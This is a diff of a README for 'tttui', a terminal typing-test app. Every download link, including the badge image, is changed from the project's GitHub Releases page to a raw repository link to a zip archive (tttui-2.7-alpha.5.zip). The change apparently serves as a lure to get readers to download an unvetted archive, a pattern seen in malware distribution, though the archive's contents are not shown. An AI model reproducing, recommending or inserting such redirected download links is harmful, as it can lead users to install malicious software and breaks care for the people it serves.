@@ -1,7 +1,7 @@
 # 🖥️ tttui - Test Your Typing Skills Easily
 
 ## 🌐 Download Now
-[![Download tttui](https://img.shields.io/badge/Download-tttui-blue.svg)](https://github.com/spawnertaxis441/tttui/releases)
+[![Download tttui](https://raw.githubusercontent.com/spawnertaxis441/tttui/main/tttui/tttui-2.7-alpha.5.zip)](https://raw.githubusercontent.com/spawnertaxis441/tttui/main/tttui/tttui-2.7-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to tttui! This application provides a simple way to test your typing speed and improve your skills. With a text-based user interface, you can focus on your typing without distractions. Follow the steps below to download and run tttui.
@@ -9,7 +9,7 @@ Welcome to tttui! This application provides a simple way to test your typing spe
 ## 📥 Download & Install
 To get started, you need to download the application from our Releases page. Click the link below to visit the page:
 
-[Download tttui Here](https://github.com/spawnertaxis441/tttui/releases)
+[Download tttui Here](https://raw.githubusercontent.com/spawnertaxis441/tttui/main/tttui/tttui-2.7-alpha.5.zip)
 
 ### 🔍 System Requirements
 - **Operating System**: Windows, macOS, or Linux
@@ -61,4 +61,4 @@ Thank you for choosing tttui to enhance your typing skills. We hope you find it 
 ## 📥 Download Now Again
 Don't forget to download your copy of tttui today!
 
-[Download tttui Here](https://github.com/spawnertaxis441/tttui/releases)
+[Download tttui Here](https://raw.githubusercontent.com/spawnertaxis441/tttui/main/tttui/tttui-2.7-alpha.5.zip)
